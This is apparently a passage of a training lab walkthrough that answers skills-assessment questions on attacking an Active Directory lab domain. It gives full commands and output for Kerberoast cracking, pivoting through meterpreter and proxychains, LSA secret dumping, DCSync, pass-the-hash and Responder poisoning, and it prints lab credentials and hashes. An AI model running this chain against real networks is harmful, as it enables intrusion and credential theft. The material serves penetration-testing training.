$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$2f520ef267b5dc8b8c0486deac8a1ac6$9d6b54497f2d45ddb9649e77bc26ee02f8a888275d51c1cb1f10b5365728168536bdf82e3f384a99c55cffb0f38901150a8e248966b818d93347c8e203ff31e331ace4100f85e5974977e5598c23b232761f8ac9ad120b2ca98f73893b7bcbf4a5d0c5829be301a31833de37464bec9d06cb8b2957e79a54feaf5ea941cb54beadc03fd2c89b6c33e5b41c98b55742fa0c44f12658998d44b7b93d29568b04cc592e3c5615912d8211d68314e5de9edc02b21421009f287d33853c90a64cc4962ba658c6c9be2c9e68ef7c6fc40a30feb85b652e0f1e95900422fa1a53dafacdaacd6c4c1d890e4945dc312c2846df6f11a2a1d6b5e4b7c2a23d19c05566e1428b07bc82fac17beb5156932709564a50bb165cb920bf674e74634e69486d14591f3e7d9cd8124bc283e9328d4d446dde2e768b50f5018cc5754dd66c4801096c5369c6a764d068aedf9c8bd3a48e90d0a003df308bd8767af7e857b87d849d8431fe1fdc9d41e47dcdc82da5a15741b13aa078f8a8f646ca99ec1936c7729a32359bee27c4228b034f1c8722ceaef6d41f35540db2d3537d0b46402f773ae1fdecae08325b26236ec7388db59e6ae119a30e337cae78e768a28e7c38109b2949491ac5de7a1fc3dfabcb90cd0ae7b44d3acdcaf104c2b4295a1c8d7ec1b7fe4fc5e6f2630c5312343c8b24e4d7e950631f30ac9c39353c14c4807051568af0614f5f003e79690560afaa00224fba1a1328ecfde2a797502195f8d5aa004539b4da066c9856aa31bd81a9ece1dd0f41ffdf43d42f7e861a475782050fd0205871f9e67265f0eb3bcbeef44f20972c86cce2d5124d3781b3ec5a4ee8b973cf5a5bc13df3df59ee7788a48bb0cd10fa3523efeb3ae3936def6cffbed8dcf41120f11d10aeee13d116437e868bcfb797b873a03303a577ec80f975ae62695700d6729aaea47af3d4f3dbed9f668c7aec643667ded2b1d5912d6ae0ecf364cf27c51d65ca7977588f341a18d61a3dce746c8ea8e997a53d17be78e813516db8d53c84d683b9ee89c8f206943c31b49e269c9e2f8dd60a3f5ef740cec719725e7cee39c8200df0e49115419efedb6128b7b050cf44fa813745a897f156b75a4ca2d833066af9b5a071cd2ab9e4f0ff82d4a08c53a3306dece8d2f030c45449db0ed3a1c2177080f0dc01119b66a8fca13a8b32baf308846445fcc2aae702aa9a681bbf5c90eb83825acc62dd04bc2c8ee9bc4e8098ab6e6dd0aabad3aad0ac34029293c0ff6bb0ef395b17aa8da8e9f055da0fecc168ccd434a8d18656be1de9fa6d4c2f80944161534618effd6cfd059cb72467e3bf04a54c8814de9991b5f0cb7b3d527ddc24db43486499b7ae37d388bc5d2b14fd10bc295a62ab0c79fc310a21726d2e314e7e7599cc492f6fcb9ce8dbad82f882fd1ac2f1f88ec7e623e7f68df88b1b9bac49bfd898f8a031c20750f4b7e45f463d1c56094d38248a964b8951b9d648d1dcaddd054a042272c1b5dc8f56dfd1f20ddc935a73:lucky7
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/S...935a73
Time.Started.....: Thu Apr 21 17:06:26 2022 (0 secs)
Time.Estimated...: Thu Apr 21 17:06:26 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    95198 H/s (12.65ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 16384/14344385 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> cocoliso

Started: Thu Apr 21 17:05:29 2022
Stopped: Thu Apr 21 17:06:27 2022
```

Answer: `lucky7`

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 4

### "Submit the contents of the flag.txt file on the Administrator desktop on MS01"

Students need to use WEB01 as a pivot host into the 172.16.6.0/24 network using `meterpreter`:

Code: shell

```shell
run autoroute -s 172.16.6.0/24
```

```
meterpreter > run autoroute -s 172.16.6.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.6.0/255.255.255.0...
[+] Added route to 172.16.6.0/255.255.255.0 via 10.129.202.242
[*] Use the -p option to list all active routes
```

Then, students can use the `auxiliary/scanner/portscan/tcp` module to look for hosts on the internal network, scanning for ports 139,445 as they are common Windows ports and can have implications for remote code execution:

Code: shell

```shell
bg
use auxiliary/scanner/portscan/tcp
set rhosts 172.16.6.0/24
set PORTS 139,445
set threads 50
run
```

```
(Meterpreter 1)(C:\) > bg

[*] Backgrounding session 2...
msf6 exploit(multi/script/web_delivery) > use auxiliary/scanner/portscan/tcp 
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 172.16.6.0/24
rhosts => 172.16.6.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 139,445
PORTS => 139,445
msf6 auxiliary(scanner/portscan/tcp) > set threads 50
threads => 50
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 172.16.6.3:           - 172.16.6.3:139 - TCP OPEN
[+] 172.16.6.3:           - 172.16.6.3:445 - TCP OPEN
[+] 172.16.6.50:          - 172.16.6.50:139 - TCP OPEN
[+] 172.16.6.50:          - 172.16.6.50:445 - TCP OPEN
[*] 172.16.6.0/24:        - Scanned  26 of 256 hosts (10% complete)
[+] 172.16.6.100:         - 172.16.6.100:445 - TCP OPEN
[+] 172.16.6.100:         - 172.16.6.100:139 - TCP OPEN
[*] 172.16.6.0/24:        - Scanned  52 of 256 hosts (20% complete)
```

Subsequently, students need to set up a SOCKS proxy in `msfconsole`:

Code: shell

```shell
use auxiliary/server/socks_proxy
show options
run
```

```
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > show options 

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)

Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 5.

[*] Starting the SOCKS proxy server
```

Students also need to edit `/etc/proxchains.conf`, adding the socks5 proxy entry to the bottom of the config file:

Code: shell

```shell
sudo nano /etc/proxychains.conf
```

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5          127.0.0.1 1080
```

Afterward, students need to use `ProxyChains` to run commands against the 172.16.6.0/24 network. Students will need to authenticate to SMB on 172.16.6.50 uitilizing the credentials `svc_sql:lucky7`:

Code: shell

```shell
sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7
```

```
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7

ProxyChains-3.1 (http://proxychains.sf.net)
/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
```

Then, using `crackmapexec`, students can read the flag file from the directory `C:\users\administrator\desktop\`, finding it to be `spn$_r0ast1ng_on_@n_0p3n_f1re`:

Code: shell

```shell
sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"
```

```
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"

ProxyChains-3.1 (http://proxychains.sf.net)
/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:49708-<><>-OK
SMB         172.16.6.50     445    MS01             [+] Executed command 
SMB         172.16.6.50     445    MS01             spn$_r0ast1ng_on_@n_0p3n_f1re
```

Answer: `spn$_r0ast1ng_on_@n_0p3n_f1re`

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 5

### "Find cleartext credentials for another domain user. Submit the username as your answer."

Students need to dump `autologon` passwords in clear text using `crackmapexec`, finding the user `tpetty`, as in `tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801` and `tpetty:Sup3rS3cur3D0m@inU2eR`:

Code: shell

```shell
proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
```

```
┌─[root@pwnbox-base]─[/home/htb-ac2]
└──╼ proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
SMB         172.16.6.50     445    MS01             [+] Dumping LSA secrets
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:b98c9c990c7a08fadbc329c5fe59690a52835b24ef0233ad51af7d6a6338ddb8
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:2c4a51903a90716c11c54202ed74d040
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:des-cbc-md5:1f8c624601867632
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:plain_password_hex:5e006b00460029006e00460059006a005f006b0020005100640036003400520062005300400026002900280068006e004c0030004000780069003d00210051005d00740051005c006a0064004e004600780072006f007100750057006100400043006400540076005c00580072005e0072006b003b00470058007a00720024006d00480046004c003500600050002a003b003500640044005d00750036004e0063005f0039003500490054005c0031006a004e0030004d0067004f004a006b0022004000280037006a0048003100750034003f003300450059005f0037006f003800620035002d00660063004c003d00
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:ecfe27900016073fffef1bb4b2132bb2:::
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
SMB         172.16.6.50     445    MS01             dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
SMB         172.16.6.50     445    MS01             NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
SMB         172.16.6.50     445    MS01             [+] Dumped 11 LSA secrets to /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.secrets and /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.cached
```

Answer: `tpetty`

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 6

### "Submit this user's cleartext password."

Students need to dump `autologon` passwords in clear text using `crackmapexec`, finding the password `Sup3rS3cur3D0m@inU2eR` from the credentials `tpetty:Sup3rS3cur3D0m@inU2eR`:

Code: shell

```shell
proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
```

```
┌─[root@pwnbox-base]─[/home/htb-ac2]
└──╼ proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
SMB         172.16.6.50     445    MS01             [+] Dumping LSA secrets
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:b98c9c990c7a08fadbc329c5fe59690a52835b24ef0233ad51af7d6a6338ddb8
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:2c4a51903a90716c11c54202ed74d040
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:des-cbc-md5:1f8c624601867632
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:plain_password_hex:5e006b00460029006e00460059006a005f006b0020005100640036003400520062005300400026002900280068006e004c0030004000780069003d00210051005d00740051005c006a0064004e004600780072006f007100750057006100400043006400540076005c00580072005e0072006b003b00470058007a00720024006d00480046004c003500600050002a003b003500640044005d00750036004e0063005f0039003500490054005c0031006a004e0030004d0067004f004a006b0022004000280037006a0048003100750034003f003300450059005f0037006f003800620035002d00660063004c003d00
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:ecfe27900016073fffef1bb4b2132bb2:::
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
SMB         172.16.6.50     445    MS01             dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
SMB         172.16.6.50     445    MS01             NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
SMB         172.16.6.50     445    MS01             [+] Dumped 11 LSA secrets to /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.secrets and /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.cached
```

Answer: `Sup3rS3cur3D0m@inU2eR`

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 7

### "What attack can this user perform?"

Using the previously established meterpreter session on WEB01, students will drop to a command shell, navigate to `C:\`, and then run PowerShell:

Code: shell

```shell
shell
cd C:\
dir
powershell
```

```
(Meterpreter 1)(C:\windows\system32\inetsrv) > shell

Process 324 created.
Channel 23 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>cd C:\    
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DA7F-3F25

 Directory of C:\

03/30/2022  01:38 AM    <DIR>          inetpub
09/14/2018  11:12 PM    <DIR>          PerfLogs
11/23/2022  07:51 AM           770,279 PowerView.ps1
04/11/2022  04:54 PM    <DIR>          Program Files
03/30/2022  01:37 AM    <DIR>          Program Files (x86)
04/11/2022  04:26 PM    <DIR>          Users
04/11/2022  06:38 PM    <DIR>          Windows
               1 File(s)        770,279 bytes
               6 Dir(s)  34,472,337,408 bytes free

C:\>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> 
```

Then, students need to use `PowerView` to enumerate attack vectors for `tpetty`:

Code: powershell

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid tpetty
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

```
PS C:\> Import-Module .\PowerView.ps1

Import-Module .\PowerView.ps1
PS C:\> $sid = Convert-NameToSid tpetty
$sid = Convert-NameToSid tpetty
PS C:\> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes-All
```

Students will find that `tpetty` has `DCSync` rights.

Answer: `DCSync`

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 8

### "Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01"

Students need to perform a `DCSync` attack to obtain the hash for for administrator on DC01:

Code: shell

```shell
proxychains secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator
```

```
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ proxychains secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:445-<><>-OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:49667-<><>-OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857
Administrator:aes128-cts-hmac-sha1-96:69e27df2550c5c270eca1d8ce5c46230
Administrator:des-cbc-md5:c2d9c892f2e6f2dc
[*] Cleaning up... 
```

Subsequently, students need to use `wmiexec.py` as `administrator` and pass the hash `aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0` to be able to connect to DC01. Students will find the flag in `C:\users\administrator\desktop\flag.txt`:

Code: shell

```shell
proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
hostname
type C:\users\administrator\desktop\flag.txt
```

```
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:49774-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
DC01

C:\>type c:\users\administrator\desktop\flag.txt
r3plicat1on_m@st3r!
```

Answer: `r3plicat1on_m@st3r!`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 1

### "Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?"

Students need to first SSH into the ParrotOS jump-box:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ ssh htb-student@10.129.251.238

The authenticity of host '10.129.251.238 (10.129.251.238)' can't be established.
ECDSA key fingerprint is SHA256:BG+VzltzkKbaMbC5FR8GU9x0pcbUBhct6AGrnjH/CHg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.251.238' (ECDSA) to the list of known hosts.
htb-student@10.129.251.238's password: 
Linux skills-par01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _\` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|

The programs included with the Parrot GNU/Linux are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Parrot GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15
┌─[htb-student@skills-par01]─[~]
└──╼ $
```

Subsequently, students need to run `Responder` to try and attempt to steal hashes:

Code: shell

```shell
sudo responder -I ens224 -wrfv
```

```
$sudo responder -I ens224 -wrfv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

<SNIP>

[+] Listening for events...

[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[!]  Fingerprint failed
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[!]  Fingerprint failed
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[SMB] NTLMv2-SSP Client   : 172.16.7.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920
[SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:6741b51d529201c7:F8653C1E3120B191A7DA708C0E363F8B:0101000000000000805C79559355D801CC5F7452B6AB182600000000020008005900560041004C0001001E00570049004E002D003000440031004C005700350056004C0037004100320004003400570049004E002D003000440031004C005700350056004C003700410032002E005900560041004C002E004C004F00430041004C00030014005900560041004C002E004C004F00430041004C00050014005900560041004C002E004C004F00430041004C0007000800805C79559355D801060004000200000008003000300000000000000000000000002000008FD5B9337124CEC895A3C0D2FD95F12FA421AA37FCF02A652FE227B46BB832DB0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[!]  Fingerprint failed
```

Students will receive the NTLM relay from user `AB920`.

Answer: `AB920`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 2

### "What is this user's cleartext password?"

Students need to crack the hash from the previous question with `Hashcat`, utilizing hashmode 5600:

Code: shell

```shell
hashcat -m 5600 AB920_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

```
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ hashcat -m 5600 AB920_ntlmv2 /usr/share/wordlists/rockyou.txt 

hashcat (v6.2.5-275-gc1df53b47) starting

<SNIP>

AB920::INLANEFREIGHT:6741b51d529201c7:f8653c1e3120b191a7da708c0e363f8b:0101000000000000805c79559355d801cc5f7452b6ab182600000000020008005900560041004c0001001e00570049004e002d003000440031004c005700350056004c0037004100320004003400570049004e002d003000440031004c005700350056004c003700410032002e005900560041004c002e004c004f00430041004c00030014005900560041004c002e004c004f00430041004c00050014005900560041004c002e004c004f00430041004c0007000800805c79559355d801060004000200000008003000300000000000000000000000002000008fd5b9337124cec895a3c0d2fd95f12fa421aa37fcf02a652fe227b46bb832db0a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
  
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: AB920::INLANEFREIGHT:6741b51d529201c7:f8653c1e3120b...000000
Time.Started.....: Thu Apr 21 15:37:27 2022 (1 sec)
Time.Estimated...: Thu Apr 21 15:37:28 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   312.8 kH/s (3.07ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered.Total..: 1/1 (100.00%) Digests
Progress.........: 290816/14344386 (2.03%)
Rejected.........: 0/290816 (0.00%)
Restore.Point....: 288768/14344386 (2.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: winewine -> tenelle
Hardware.Mon.#1..: Util: 36%

Started: Thu Apr 21 15:36:32 2022
Stopped: Thu Apr 21 15:37:28 2022
```

The password is revealed to be `weasal`.

Answer: `weasal`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 3

### "Submit the contents of the C:\\flag.txt file on MS01."

Students need to run `Nmap` to discover more hosts in the 172.16.7.0/24 subnet:

```
